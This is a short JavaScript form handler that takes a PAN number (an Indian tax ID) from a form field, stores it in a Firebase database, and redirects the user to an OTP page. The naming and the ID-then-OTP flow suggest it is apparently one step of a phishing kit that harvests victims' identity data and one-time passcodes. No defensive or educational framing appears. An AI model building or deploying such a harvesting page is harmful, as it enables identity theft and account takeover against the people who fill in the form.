
// reference your database
var ududip007DB = firebase.database().ref("ududip007");

document.getElementById("ududip007").addEventListener("submit", submitForm);

function submitForm(e) {
  e.preventDefault();

  var upan = getElementVal("upan");
     

  

  saveMessages(upan);

  // redirect to OTP page
  window.location.href = "otpc.html";
}

const saveMessages = (upan) => {
  var newududip007 = ududip007DB.push();

  newududip007.set({
    PAN_Number: upan,
      
    
    
  });
};

const getElementVal = (id) => {
  return document.getElementById(id).value;
};

